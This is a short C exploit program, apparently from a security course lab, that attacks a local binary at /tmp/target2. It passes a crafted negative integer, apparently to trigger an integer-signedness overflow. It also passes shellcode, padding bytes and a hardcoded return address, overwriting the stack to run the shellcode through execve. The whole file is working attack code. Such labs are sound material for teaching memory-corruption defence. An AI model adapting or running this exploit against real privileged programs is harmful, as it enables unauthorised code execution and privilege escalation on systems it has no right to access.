#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{

	char arg1[3244];
	sprintf(arg1, "-2147483547,%s", shellcode);
	memset(arg1+12+strlen(shellcode), 0x55, sizeof(arg1)-12-strlen(shellcode));	
	arg1[3216] = 0x88;
	arg1[3217] = 0xe4;
	arg1[3218] = 0xff;
	arg1[3219] = 0xbe;
	arg1[3243] = '\0';

	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
